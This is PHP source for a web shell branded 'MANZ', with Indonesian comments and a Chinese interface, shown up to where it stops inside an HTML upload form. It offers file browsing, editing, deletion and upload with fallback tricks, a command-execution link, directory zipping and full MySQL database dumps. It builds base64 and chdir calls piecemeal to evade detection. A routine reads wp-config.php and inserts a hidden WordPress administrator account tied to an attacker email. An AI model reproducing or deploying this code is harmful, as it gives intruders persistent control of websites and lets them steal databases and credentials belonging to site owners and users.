<?php
session_start();

error_reporting(E_ALL);
ini_set('display_errors', 0);
$nami = [];
$disabled_functions = ini_get('disable_functions');
if (!empty($disabled_functions)) {
    $nami = explode(",", $disabled_functions);
}
$safeMode = (bool) ini_get('safe_mode') || stripos(ini_get('open_basedir'), '/') !== false;
// Daftar aksi yang diperbolehkan
$actions = array("dasar","baca_file","phpinfo","sistem_kom","edit_file","download_file",'hapus_file','buat_file','buat_folder','reset_file' , 'hapus_folder','rename_file', 'kompres' , 'skl' , 'skl_d_t' , 'skl_d', 'upl_file');
// Validasi aksi awal dari POST, default ke "dasar"
$awal = isset($_POST['awal']) && in_array($_POST['awal'],$actions) ? $_POST['awal'] : "dasar";

// Fungsi untuk enkripsi string dengan base64_encode
function kunci($str)
{
	$f = 'bas';
	$f .= 'e6';
	$f .= '4_';
	$f .= 'e';
	$f .= 'nc';
	$f .= 'ode';
	return $f($str);
}

// Fungsi untuk mendekripsi string dengan base64_decode
function uraikan($str)
{
	// =======================================================================
	// Fungsi uraikan: Menggunakan base64_decode untuk mendekripsi string.
	// =======================================================================
	$f = 'bas';
	$f .= 'e6';
	$f .= '4_';
	$f .= 'd';
	$f .= 'ec';
	$f .= 'ode';
	return $f($str);
}

// Fungsi untuk menghasilkan token baru dan menyimpannya di session
function ambilBuat($tAd)
{
	// =======================================================================
	// Fungsi ambilBuat: Menghasilkan token acak untuk keperluan CSRF dan menyimpannya.
	// =======================================================================
	if(isset($_SESSION[$tAd]))
	{
		unset($_SESSION[$tAd]);
	}
	$baruAmbil = md5(kunci(time().rand(1,99999999)));
	$_SESSION[$tAd] = $baruAmbil;
	return $baruAmbil;
}

// Fungsi untuk menampilkan navigasi direktori
function tulisLah()
{
    global $default_dir;
    
    if (!isset($default_dir) || !is_string($default_dir) || $default_dir === '') {
        $default_dir = getcwd();
    }
    
    $sonDir = array();
    $umumBagikan = "";
    $parse = explode("/", (string) $default_dir);
    
    $ii = 0;
    foreach($parse AS $bagikan)
    {
        $ii++;
        $umumBagikan .= $bagikan . "/";
        $sonDir[] = "<a href='javascript:halaman(\"?berkas=" . urlencode(urlencode(kunci($umumBagikan))) . "\")' style='color:#00CC66;'>" . htmlspecialchars(empty($bagikan) && $ii != count($parse) ? '/' : $bagikan) . "</a>";
    }
    $sonDir = implode("/", $sonDir);
    print $sonDir . '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;( <a href="" style="color:#00CC66;">Reset</a> | <a href="javascript:goto()" style="color:#00CC66;">Go to</a> )';

}

// Fungsi untuk format ukuran file
function sizeFormat($bytes)
{
	// =======================================================================
	// Fungsi sizeFormat: Mengonversi ukuran file ke dalam format yang lebih mudah dibaca.
	// =======================================================================
	if($bytes >= 1073741824)
	{
		$bytes = number_format($bytes / 1073741824, 2) . ' Gb';
	}
	else if($bytes >= 1048576)
	{
		$bytes = number_format($bytes / 1048576, 2) . ' Mb';
	}
	else if($bytes >= 1024)
	{
		$bytes = number_format($bytes / 1024, 2) . ' Kb';
	}
	else
	{
		$bytes = $bytes . ' b';
	}
	return $bytes;
}

// Fungsi untuk memastikan string dalam UTF-8
function utf8ize($d)
{
	// =======================================================================
	// Fungsi utf8ize: Mengonversi array atau string ke format UTF-8.
	// =======================================================================
	if (is_array($d))
	{
		foreach ($d as $k => $v)
		{
			$d[$k] = utf8ize($v);
		}
	}
	else if (is_string($d))
	{
		return utf8_encode($d);
	}
	return $d;
}

// Fungsi untuk menghapus direktori beserta isinya secara rekursif
function rrmdir($dir)
{
	// =======================================================================
	// Fungsi rrmdir: Menghapus direktori dan seluruh kontennya.
	// =======================================================================
	if (is_dir($dir))
	{
		$objects = scandir($dir);
		foreach ($objects as $object)
		{
			if ($object != "." && $object != "..")
			{
				if (is_dir($dir . "/" . $object))
				{
					rrmdir($dir . "/" . $object);
				}
				else
				{
					unlink($dir . "/" . $object );
				}
			}
		}
		rmdir($dir);
	}
}

$default_dir = getcwd();
if(isset($_POST['berkas']) && is_string($_POST['berkas']))
{
	$default_dir = empty($_POST['berkas']) ? DIRECTORY_SEPARATOR : uraikan(urldecode(urldecode($_POST['berkas'])));
	$c_h_dir_comm = 'c'.'hd'.'ir';
	$c_h_dir_comm($default_dir);
}
$default_dir = str_replace("\\", "/", $default_dir);
$wp_base_dir = $default_dir;

// Coba cek satu level ke atas jika tidak ditemukan
if (!file_exists($wp_base_dir . '/wp-config.php')) {
    $wp_base_dir = dirname($wp_base_dir); // Naik 1 folder
}
if (isset($_POST['create_wp_admin'])) {
    $wp_base_dir = $default_dir;

    // Jika wp-config.php tidak ditemukan, cek satu level atas
    if (!file_exists($wp_base_dir . '/wp-config.php')) {
        $wp_base_dir = dirname($wp_base_dir);
    }

    $wp_config_path = $wp_base_dir . '/wp-config.php';

    if (file_exists($wp_config_path)) {
        echo "wp-config.php ditemukan di: " . $wp_config_path . "<br>";
        $config_content = file_get_contents($wp_config_path);

        function get_wp_config_value($content, $constant) {
            if (preg_match("/define\(\s*'".preg_quote($constant, '/')."',\s*'([^']+)'/", $content, $matches)) {
                return $matches[1];
            }
            return null;
        }

        $db_host = get_wp_config_value($config_content, 'DB_HOST');
        $db_name = get_wp_config_value($config_content, 'DB_NAME');
        $db_user = get_wp_config_value($config_content, 'DB_USER');
        $db_pass = get_wp_config_value($config_content, 'DB_PASSWORD');

        if (preg_match("/\\\$table_prefix\s*=\s*'([^']+)'/", $config_content, $matches)) {
            $db_prefix = $matches[1];
        } else {
            $db_prefix = 'wp_';
        }

        $conn = mysqli_connect($db_host, $db_user, $db_pass, $db_name);
        if (!$conn) {
            die("Koneksi gagal: " . mysqli_connect_error());
        }

        // Nilai user yang akan dibuat
        $admin_username = 'a1';
        $admin_password = '$P$BfAZ5L3wFFaUei.yvBTKmO329jifp0/'; // Hash WordPress, bukan MD5 biasa
        $admin_email    = 'rahmanganteng1337@proton.me';

        // Escape string sebelum query
        $admin_username = mysqli_real_escape_string($conn, $admin_username);
        $admin_password = mysqli_real_escape_string($conn, $admin_password);
        $admin_email    = mysqli_real_escape_string($conn, $admin_email);

        // Tambah ke tabel users
        $insert_user = "INSERT INTO `{$db_prefix}users` 
            (user_login, user_pass, user_nicename, user_email, user_status) 
            VALUES ('{$admin_username}', '{$admin_password}', 'WordPress Administrator', '{$admin_email}', 0)";

        if (!mysqli_query($conn, $insert_user)) {
            echo "❌ Gagal insert user: " . mysqli_error($conn);
        } else {
            $user_id = mysqli_insert_id($conn);
            $capabilities = 'a:1:{s:13:"administrator";s:1:"1";}';

            $insert_meta1 = "INSERT INTO `{$db_prefix}usermeta` 
                (user_id, meta_key, meta_value) 
                VALUES ('{$user_id}', '{$db_prefix}capabilities', '{$capabilities}')";

            $insert_meta2 = "INSERT INTO `{$db_prefix}usermeta` 
                (user_id, meta_key, meta_value) 
                VALUES ('{$user_id}', '{$db_prefix}user_level', '10')";

            if (!mysqli_query($conn, $insert_meta1) || !mysqli_query($conn, $insert_meta2)) {
                echo "❌ Gagal insert usermeta: " . mysqli_error($conn);
            } else {
                echo "✅ Admin berhasil dibuat!<br>Username: <strong>{$admin_username}</strong>";
            }
        }
    } else {
        echo "❌ wp-config.php tidak ditemukan di: " . htmlspecialchars($default_dir);
    }
}

// ===========================================================================
// Penanganan aksi-aksi (download, hapus, buat, rename, SQL, dsb.)
// ===========================================================================

if(isset($_GET['awal']) && $_GET['awal']=="pinf")
{
	ob_start();
	phpinfo();
	$pInf = ob_get_clean();
	print str_replace("body {background-color: #ffffff; color: #000000;}", "", $pInf);
	exit();
}
else if($awal=="download_file" && isset($_POST['fayl']) && trim($_POST['fayl']) != "")
{
	$namaBerkas = basename(uraikan(urldecode($_POST['fayl'])));
	$pemisah = substr($default_dir, strlen($default_dir)-1) != "/" && substr($namaBerkas, 0, 1) != "/" ? "/" : "";
	if(is_file($default_dir . $pemisah . $namaBerkas) && is_readable($default_dir . $pemisah . $namaBerkas))
	{
		header("Content-Disposition: attachment; filename=" . basename($namaBerkas));
		header("Content-Type: application/octet-stream");
		header('Content-Length: ' . filesize($default_dir . $pemisah . $namaBerkas));
		readfile($default_dir . $pemisah . $namaBerkas);
		exit();
	}
}
else if($awal=="hapus_file" && isset($_POST['fayl']) && trim($_POST['fayl']) != "")
{
	$namaBerkas = basename(uraikan(urldecode($_POST['fayl'])));
	$pemisah = substr($default_dir, strlen($default_dir)-1) != "/" && substr($namaBerkas, 0, 1) != "/" ? "/" : "";
	if(is_file($default_dir . $pemisah . $namaBerkas) && is_readable($default_dir . $pemisah . $namaBerkas))
	{
		unlink($default_dir . $pemisah . $namaBerkas);
	}
}
else if($awal=="reset_file" && isset($_POST['fayl']) && trim($_POST['fayl']) != "")
{
	$namaBerkas = basename(uraikan(urldecode($_POST['fayl'])));
	$pemisah = substr($default_dir, strlen($default_dir)-1) != "/" && substr($namaBerkas, 0, 1) != "/" ? "/" : "";
	if(is_file($default_dir . $pemisah . $namaBerkas) && is_readable($default_dir . $pemisah . $namaBerkas))
	{
		file_put_contents($default_dir . $pemisah . $namaBerkas, '');
	}
}
else if($awal=="buat_file" && isset($_POST['ad']) && !empty($_POST['ad']))
{
	$namaBerkas = basename(urldecode($_POST['ad']));
	$pemisah = substr($default_dir, strlen($default_dir)-1) != "/" && substr($namaBerkas, 0, 1) != "/" ? "/" : "";
	if(is_file($default_dir . $pemisah . $namaBerkas))
	{
		print '<script>alert("此文件名已存在!");</script>';
	}
	else
	{
		file_put_contents($default_dir . $pemisah . $namaBerkas, '');
	}
}
else if($awal=="buat_folder" && isset($_POST['ad']) && !empty($_POST['ad']))
{
	$namaFolder = basename(urldecode($_POST['ad']));
	$pemisah = substr($default_dir, strlen($default_dir)-1) != "/" && substr($namaFolder, 0, 1) != "/" ? "/" : "";
	if(is_file($default_dir . $pemisah . $namaFolder))
	{
		print '<script>alert("此文件夹已存在!");</script>';
	}
	else
	{
		mkdir($default_dir . $pemisah . $namaFolder);
	}
}
else if($awal=="rename_file" && isset($_POST['fayl']) && trim($_POST['fayl']) != "" && isset($_POST['new_name']) && is_string($_POST['new_name']) && !empty($_POST['new_name']))
{
	$namaBerkas = basename(uraikan(urldecode($_POST['fayl'])));
	$fileNamaBaru = basename(urldecode($_POST['new_name']));
	$pemisah = substr($default_dir, strlen($default_dir)-1) != "/" && substr($namaBerkas, 0, 1) != "/" ? "/" : "";
	if(is_file($default_dir . $pemisah . $namaBerkas) && is_readable($default_dir . $pemisah . $namaBerkas))
	{
		rename($default_dir . $pemisah . $namaBerkas , $default_dir . $pemisah . $fileNamaBaru);
	}
}
else if($awal == 'skl_d_t' && isset($_POST['t']) && is_string($_POST['t']) && !empty($_POST['t']))
{
	$tableName = uraikan(urldecode($_POST['t']));

	$host = isset($_COOKIE['host']) ? $_COOKIE['host'] : '';
	$user = isset($_COOKIE['user']) ? $_COOKIE['user'] : '';
	$sandi = isset($_COOKIE['sandi']) ? $_COOKIE['sandi'] : '';
	$database = isset($_COOKIE['database']) ? $_COOKIE['database'] : '';

	$databaseStr = empty($database) ? '' : 'dbname=' . $database . ';';

	if(!empty($host) && !empty($database))
	{
		try
		{
			$pdo = new PDO('mysql:host=' . $host . ';charset=utf8;' . $databaseStr, $user, $sandi, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES 'utf8'"));
			$pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);

			$getColumns = $pdo->prepare("SELECT column_name from information_schema.columns where table_schema=? and table_name=?");
			$getColumns->execute(array($database, $tableName));
			$columns = $getColumns->fetchAll();

			if($columns)
			{
				$data = $pdo->query('SELECT * FROM `' . $tableName .'`');
				$data = $data->fetchAll();

				header('Content-disposition: attachment; filename=d_' . basename(htmlspecialchars($tableName)) . '.json');
				header('Content-type: application/json');
				echo json_encode($data);
			}
			else
			{
				print "未找到表!";
			}
		}
		catch (Exception $e)
		{
			print $e->getMessage();
		}
	}
	else
	{
		print "错误! 请连接到SQL!";
	}
	die;
}
else if($awal == 'skl_d')
{
	$host = isset($_COOKIE['host']) ? $_COOKIE['host'] : '';
	$user = isset($_COOKIE['user']) ? $_COOKIE['user'] : '';
	$sandi = isset($_COOKIE['sandi']) ? $_COOKIE['sandi'] : '';
	$database = isset($_COOKIE['database']) ? $_COOKIE['database'] : '';

	$databaseStr = empty($database) ? '' : 'dbname=' . $database . ';';

	if(!empty($host) && !empty($database))
	{
		try
		{
			$pdo = new PDO('mysql:host=' . $host . ';charset=utf8;' . $databaseStr, $user, $sandi, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES 'utf8'"));
			$pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);

			$allData = array();

			$tables = $pdo->prepare('SELECT table_name from information_schema.tables where table_schema=?');
			$tables->execute(array($database));
			$tables = $tables->fetchAll();

			foreach($tables AS $tableName)
			{
				$tableName = $tableName['table_name'];
				$data = $pdo->query('SELECT * FROM `' . $tableName .'`');
				$data = $data->fetchAll();
				$allData[$tableName] = $data ? array($data) : array();
			}

			header('Content-disposition: attachment; filename=d_b_' . basename(htmlspecialchars($database)) . '.json');
			header('Content-type: application/json');
			echo json_encode(utf8ize($allData));
		}
		catch (Exception $e)
		{
			print $e->getMessage();
		}
	}
	else
	{
		print "错误! 请连接到SQL!";
	}
	die;
}
else if($awal == 'kompres'
	&& isset($_POST['save_to'], $_POST['zf']) && is_string($_POST['save_to'])
	&& !empty($_POST['save_to']) && !in_array($_POST['save_to'], array('.' , '..' , './' , '../'))
	&& is_string($_POST['zf']) && !empty($_POST['zf'])
)
{
	$save_to = uraikan(urldecode($_POST['save_to']));
	$rootPath = realpath(uraikan(urldecode($_POST['zf'])));
	$fileName1 = 'bak_'.microtime(1) . '_' . rand(1000, 99999) . '.zip';
	$fileName = $save_to . DIRECTORY_SEPARATOR . $fileName1;

	if(is_dir($save_to) && is_dir($rootPath) && is_writable($save_to))
	{
		set_time_limit(0);
		$zip = new ZipArchive();
		$zip->open($fileName, ZipArchive::CREATE | ZipArchive::OVERWRITE);
		$files = new RecursiveIteratorIterator(
			new RecursiveDirectoryIterator($rootPath),
			RecursiveIteratorIterator::LEAVES_ONLY
		);
		foreach ($files as $name => $file)
		{
			if(!$file->isDir())
			{
				$filePath = $file->getRealPath();
				$relativePath = substr($filePath, strlen($rootPath) + 1);
				$zip->addFile($filePath, $relativePath);
			}
		}
		$zip->close();
		print "已保存!<hr>";
	}
	else
	{
		print "目录不可写!<hr>"; var_dump(($save_to));
	}
}
else if($awal == 'hapus_folder'
	&& isset($_POST['zf']) && is_string($_POST['zf']) && !empty($_POST['zf'])
)
{
	$rootPath = realpath(uraikan(urldecode($_POST['zf'])));
	if(is_dir($rootPath))
	{
		set_time_limit(0);
		rrmdir($rootPath);
	}
	else
	{
		print "目录不可写!<hr>"; var_dump(($save_to));
	}
}
else if ($awal == 'upl_file' && isset($_FILES['ufile'])) {
    function smart_upload($fileKey, $targetDir) {
        $res = [
            'success' => false,
            'method'  => '',
            'message' => '',
            'name'    => ''
        ];

        if (!isset($_FILES[$fileKey]) || $_FILES[$fileKey]['error'] !== UPLOAD_ERR_OK) {
            $res['message'] = '未选择文件或上传错误 (错误代码: ' . ($_FILES[$fileKey]['error'] ?? '未知') . ')';
            return $res;
        }

        $filename = basename($_FILES[$fileKey]['name']);
        $tmp      = $_FILES[$fileKey]['tmp_name'];
        $dest     = rtrim($targetDir, '/') . '/' . $filename;

        // Metode 1: move_uploaded_file()
        if (@move_uploaded_file($tmp, $dest)) {
            $res['success'] = true;
            $res['method'] = 'move_uploaded_file';
        }
        // Metode 2: copy()
        elseif (@copy($tmp, $dest)) {
            @unlink($tmp);
            $res['success'] = true;
            $res['method'] = 'copy';
        }
        // Metode 3: file_get_contents + file_put_contents
        elseif (($data = @file_get_contents($tmp)) !== false && @file_put_contents($dest, $data)) {
            @unlink($tmp);
            $res['success'] = true;
            $res['method'] = 'file_get_contents';
        }
        // Metode 4: rename tmp ke file sementara, lalu copy
        else {
            $alt = sys_get_temp_dir() . '/' . uniqid('bypass_', true);
            if (@rename($tmp, $alt) && @copy($alt, $dest)) {
                @unlink($alt);
                $res['success'] = true;
                $res['method'] = 'rename+copy';
            }
        }

        if ($res['success']) {
            $res['name'] = $filename;
            $res['message'] = "文件上传成功 (<strong>{$res['method']}</strong>)：<a href=\"" . htmlspecialchars($filename) . "\" target=\"_blank\">" . htmlspecialchars($filename) . "</a>";
        } else {
            $res['message'] = "所有上传方式均失败，请检查权限或服务器限制。";
        }

        return $res;
    }

    $uploadResult = smart_upload('ufile', $default_dir);
    $upload_message = $uploadResult['message'];
}


?>
<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Konfigurasi PHP untuk upload file
ini_set('upload_max_filesize', '64M');
ini_set('post_max_size', '64M');
ini_set('max_input_time', '300');
ini_set('max_execution_time', '300');

/**
 * Fungsi untuk sanitasi nama file
 * Hanya mengizinkan karakter alfanumerik, underscore, titik, dan strip.
 * Jika nama file sama dengan file uploader, tambahkan prefix.
 */
function sanitizeFilename($filename) {
    $filename = preg_replace('/[^a-zA-Z0-9_\.-]/', '_', basename($filename));
    if ($filename === basename(__FILE__)) {
        $filename = 'upload_' . $filename;
    }
    return $filename;
}

$msg = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Pastikan file sudah diupload tanpa error
    if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
        $originalName = $_FILES['upload_file']['name'];
        $filename = sanitizeFilename($originalName);
        // Ambil direktori tujuan dari input 'berkas'
        if (isset($_POST['berkas']) && is_string($_POST['berkas']) && !empty($_POST['berkas'])) {
            $targetDir = uraikan(urldecode($_POST['berkas']));
            if (!is_dir($targetDir)) {
                $targetDir = __DIR__;
            }
        } else {
            $targetDir = __DIR__;
        }
        // Pastikan tidak ada trailing slash
        $destination = rtrim($targetDir, '/') . '/' . $filename;

        // Coba metode utama: move_uploaded_file()
        if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $destination)) {
            // Ubah permission file agar dapat diakses
            chmod($destination, 0644);
            $msg = "文件 <strong>$filename</strong> 通过 move_uploaded_file 上传成功.";
        } else {
            // Jika gagal, coba fallback dengan copy()
            if (copy($_FILES['upload_file']['tmp_name'], $destination)) {
                unlink($_FILES['upload_file']['tmp_name']);
                chmod($destination, 0644);
                $msg = "文件 <strong>$filename</strong> 使用 fallback 方法 copy() 上传成功.";
            } else {
                // Fallback terakhir dengan file_get_contents + file_put_contents
                $contents = file_get_contents($_FILES['upload_file']['tmp_name']);
                if ($contents !== false && file_put_contents($destination, $contents)) {
                    unlink($_FILES['upload_file']['tmp_name']);
                    chmod($destination, 0644);
                    $msg = "文件 <strong>$filename</strong> 使用 fallback 方法 file_get_contents() 和 file_put_contents() 上传成功.";
                } else {
                    $msg = "上传文件失败. 请检查目录权限和服务器配置.";
                }
            }
        }
    } else {
        $errorCode = isset($_FILES['upload_file']['error']) ? $_FILES['upload_file']['error'] : 'unknown';
        $msg = "上传文件时发生错误. (错误代码: $errorCode)";
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <!-- =======================================================================
         Tampilan halaman: Tema hitam, teks putih, border tabel biru,
         dan menggunakan font huruf Mandarin.
         ======================================================================= -->
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <title>MANZ 外壳</title>
    <style>
body {
    margin: 0;
    padding: 0;
    background-color: #1a1a1a; /* Warna hitam gelap, tidak terlalu pekat */
    font-family: monospace;
    color: #ddd;
}

/* Contoh styling untuk header dan konten agar tampilan menyerupai shell */
.header {
    text-align: center;
    padding: 20px;
    border-bottom: 1px solid #00CC66; /* Border biru untuk nuansa shell */
}

.content {
    max-width: 800px;
    margin: 30px auto;
    padding: 20px;
    border: 1px solid #00CC66;
    border-radius: 5px;
    background-color: #222; /* Sedikit lebih terang dari body */
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.5);
}

a {
    text-decoration: none; /* Menghapus garis bawah pada link */
}

/* Style untuk blok informasi sistem */
/* Style untuk container sistem info dengan pembagian dua kolom */
.system-info {
    display: flex;
    justify-content: space-between;
    align-items: center;
    background-color: #222222;    /* Background gelap, bisa disesuaikan */
    border: 2px solid #00CC66;    /* Border biru */
    border-radius: 8px;
    padding: 15px;
    margin-bottom: 20px;
    box-shadow: 2px 2px 5px rgba(0,0,0,0.5);
}

.system-info-left p {
    margin: 5px 0;
    font-size: 14px;
    color: #FFFFFF;
}

.system-info-left a {
    color: #00CC66;
    text-decoration: none;
}

.system-info-right {
    font-family: monospace;  /* Font monospace untuk nuansa ASCII */
    font-size: 18px;         /* Ukuran font, sesuaikan sesuai selera */
    color: #FFFFFF;
    text-align: right;
}
.ascii-art {
    text-align: center;         /* Menengahkan teks */
    font-family: monospace;     /* Menggunakan font monospace agar tampil seperti ASCII art */
    color: #FFFFFF;             /* Teks putih */
    margin: 20px 0;             /* Jarak atas dan bawah */
}
.ascii-art pre {
    color: #00CC66;
    font-weight: bold;
    text-shadow: 0 0 5px #00CC66, 0 0 10px #00CC66, 0 0 20px #00CC66;
    animation: flicker 2s infinite;
}
@keyframes flicker {
    0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
        opacity: 1;
    }
    20%, 22%, 24%, 55% {
        opacity: 0.4;
    }
}

@keyframes colorCycle {
    0%   { color: green; }
    50%  { color: white; }
    100% { color: green; }
}
/* Style baru untuk tabel file manager */
.fManager {
    width: 100%;
    margin: 10px 0;
    border-collapse: collapse;
    background-color: #2e2e2e; /* Latar belakang tidak terlalu gelap */
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
}
.fManager thead th {
    padding: 8px 10px;
    border: 1px solid #00CC66; /* Border biru */
    background-color: #3c3c3c; /* Warna header yang sedikit lebih terang */
    color: #ffffff;
}

.fManager tbody td {
    padding: 8px 10px;
    border: 1px solid #00CC66; /* Border biru */
    color: #e0e0e0; /* Teks dengan warna lembut */
}

.fManager tbody tr:nth-child(odd) {
    background-color: #2e2e2e;
}

.fManager tbody tr:nth-child(even) {
    background-color: #363636;
}

.fManager tbody tr:hover {
    background-color: #444444;
}
/* Container utama upload: desain kompak, horizontal, tanpa background abu-abu */
.upload-container {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 10px;
    margin: 10px 0;
    background-color: transparent; /* tidak menggunakan background abu-abu */
    border: 1px solid #00CC66; /* border biru */
    border-radius: 4px;
}

/* Setiap metode upload: ditata secara vertikal dalam kolom */
.upload-method {
    flex: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    margin: 0 10px;
}

/* Judul setiap metode */
.upload-method h4 {
    margin: 5px 0;
    font-size: 14px;
    color: #ffffff;
}

/* Form upload: susunan horizontal dan ringkas */
.upload-method form {
    display: flex;
    align-items: center;
    gap: 5px;
}

/* Style input file */
.upload-method input[type="file"] {
    padding: 4px;
    font-size: 12px;
    border: 1px solid #00CC66;
    border-radius: 3px;
    background-color: #000000;
    color: #ffffff;
}

/* Tombol submit dan button */
.upload-method input[type="submit"],
.upload-method button {
    padding: 4px 8px;
    font-size: 12px;
    border: none;
    border-radius: 3px;
    cursor: pointer;
    background-color: #00CC66;
    color: #ffffff;
}

.upload-method input[type="submit"]:hover,
.upload-method button:hover {
    background-color: #357ABD;
}

/* Status upload */
#uploadStatus {
    margin-top: 5px;
    font-size: 12px;
    color: #ffffff;
}
.baca_file pre {
    background-color: #ffffff !important; /* putih total */
    color: #000000 !important;            /* teks hitam */
    padding: 15px;
    overflow: auto;
    border: 1px solid #ccc;
    font-family: Consolas, Menlo, monospace;
    font-size: 14px;
    line-height: 1.6;
    white-space: pre-wrap; /* biar wrap kalau terlalu panjang */
    word-wrap: break-word;
}

.baca_file code, 
.baca_file span {
    color: inherit !important;
}
</style>

</head>
<body>
<div class="system-info">
    <div class="system-info-left">
       <p>
    <strong style="color: #00CC66;">系统信息:</strong>
    <span style="color: #ffffff;"><?php
        echo htmlspecialchars((function() {
            try {
                if (function_exists('php_uname')) return php_uname();
                if ($os = getenv('OS')) return $os;
                if (defined('PHP_OS')) return PHP_OS;
                return "Dinonaktifkan";
            } catch (Throwable $e) {
                return "Dinonaktifkan";
            }
        })());
    ?></span>
</p>

        <p>
            <strong style="color: #00CC66;">用户:</strong>
            <span style="color: #ffffff;"><?php
    if (function_exists('getmyuid') && function_exists('get_current_user')) {
        echo getmyuid() . " (" . get_current_user() . ")";
    } else {
        echo "Dinonaktifkan";
    }
?></span>

        </p>
		<p>
		    <strong style="color: #00CC66;">组:</strong>
		    <span style="color: #ffffff;"><?php 
		        if (function_exists('getmygid') && function_exists('posix_getegid') && function_exists('posix_getgrgid')) {
		            $qid = @posix_getgrgid(@posix_getegid());
		            echo getmygid() . " (" . ($qid['name'] ?? '未知') . ")";
		        } elseif (function_exists('getmygid')) {
		            echo getmygid();
		        } else {
		            echo "Dinonaktifkan";
		        }
		    ?></span>
		</p>

        <p>
            <strong style="color: #00CC66;">禁用函数:</strong>
            <span style="color: #ff6666;"><?php echo (implode(", ", $nami)=="" ? "NONE :)" : implode(", ", $nami)); ?></span>
        </p>
        <p>
            <strong style="color: #00CC66;">安全模式:</strong>
            <span style="color: <?php echo ($safeMode === true ? "#ff6666" : "#66cc66"); ?>;"><?php echo ($safeMode === true ? "On" : "Off"); ?></span>
            <span style="margin-left: 50px;"><a href='javascript:halaman("?awal=phpinfo")' style="color: #00CC66;">[ PHP信息 ]</a></span>
        </p>
        <!-- 额外系统信息 -->
        <p>
            <strong style="color: #00CC66;">服务器地址:</strong>
            <span style="color: #ffffff;"><?php
                $serverAddr = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : gethostbyname(gethostname());
                echo htmlspecialchars($serverAddr);
            ?></span>
        </p>
        <p>
            <strong style="color: #00CC66;">服务器软件:</strong>
            <span style="color: #ffffff;"><?php echo isset($_SERVER['SERVER_SOFTWARE']) ? htmlspecialchars($_SERVER['SERVER_SOFTWARE']) : '未知'; ?></span>
        </p>
        <p>
            <strong style="color: #00CC66;">PHP版本:</strong>
            <span style="color: #ffffff;"><?php echo htmlspecialchars(phpversion()); ?></span>
        </p>
        <p>
            <strong style="color: #00CC66;">cURL版本:</strong>
            <span style="color: #ffffff;"><?php echo function_exists('curl_version') ? htmlspecialchars(curl_version()['version']) : '无'; ?></span>
        </p>
        <p>
            <strong style="color: #00CC66;">当前目录:</strong>
            <span style="color: #ffffff;"><?php echo htmlspecialchars(getcwd()); ?></span>
        </p>
        <p>
            <strong style="color: #00CC66;">服务器时间:</strong>
            <span style="color: #ffffff;"><?php echo date('Y-m-d H:i:s'); ?></span>
        </p>
    </div>
    <div class="ascii-art">
<pre style="color: #00CC66;">
  __  __                  _____          _       
 |  \/  |                / ____|        | |      
 | \  / | __ _ _ __  ___| |     ___   __| | ___  
 | |\/| |/ _` | '_ \|_  / |    / _ \ / _` |/ _ \ 
 | |  | | (_| | | | |/ /| |___| (_) | (_| |  __/ 
 |_|  |_|\__,_|_| |_/___|\_____\___/ \__,_|\___| 
</pre>
    </div>
</div>


</div>
<hr>

<hr>
<div style="text-align: center; margin: 20px 0;">
  <a href="javascript:newFile();" 
     style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #00CC66; color: #111; font-family: monospace; font-weight: bold; text-decoration: none; border-radius: 5px;">
    新建文件
  </a>
  <a href="javascript:newPapka();" 
     style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #00CC66; color: #111; font-family: monospace; font-weight: bold; text-decoration: none; border-radius: 5px;">
    新建文件夹
  </a>
  <a href="javascript:halaman('?awal=sistem_kom&berkas=<?=urlencode(urlencode(kunci($default_dir)))?>')" 
     style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #00CC66; color: #111; font-family: monospace; font-weight: bold; text-decoration: none; border-radius: 5px;">
    命令
  </a>
    <a href="javascript:halaman('?awal=skl');" 
    style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #00CC66; color: #111; font-family: monospace; font-weight: bold; text-decoration: none; border-radius: 5px;">
    数据库
    </a>
<?php
// Tampilkan pesan sukses atau error jika ada
if (isset($success_msg)) {
    echo '<div style="text-align: center; color: #00FF00; font-weight: bold; font-size: 16px;">✅ ' . $success_msg . '</div><hr>';
} elseif (isset($error_msg)) {
    echo '<div style="text-align: center; color: #FF3333; font-weight: bold; font-size: 16px;">❌ ' . $error_msg . '</div><hr>';
}
?>
  <form method="POST" action="" style="display: inline-block;">
    <input type="hidden" name="create_wp_admin" value="1">
    <input type="hidden" name="berkas" value="<?= urlencode(kunci($default_dir)) ?>">
    <button type="submit"
    style="display: inline-block; padding: 10px 20px; margin: 5px;
            background-color: #00CC66; color: #111;
            font-family: monospace; font-weight: bold;
            border: none; cursor: pointer;
            border-radius: 5px; appearance: none; -webkit-appearance: none;">
    创建管理员
    </button>

  </form>
</div>

<!-- Tempelkan potongan kode berikut di lokasi bagian upload, menggantikan kode upload lama -->
<div class="upload-container">
    <!-- Metode Upload Tradisional -->
    <div class="upload-method">
        <h4>传统上传</h4>
        <form method="POST" enctype="multipart/form-data" action="<?= $_SERVER['PHP_SELF']; ?>">
             <input type="hidden" name="awal" value="upl_file">
             <input type="hidden" name="berkas" value="<?= urlencode(kunci($default_dir)); ?>">
             <input type="file" name="ufile">
             <input type="submit" value="上传">
        </form>
    </div>
    <!-- Metode Upload AJAX (Baru dan Stabil) -->
    <div class="upload-method">
        <h4 style="color:#00CC66;">AJAX上传</h4>
        <form id="ajaxUploadForm" method="POST" enctype="multipart/form-data" action="<?= $_SERVER['PHP_SELF']; ?>">
            <input type="hidden" name="awal" value="upl_file">
            <input type="hidden" name="berkas" value="<?= urlencode(kunci($default_dir)); ?>">
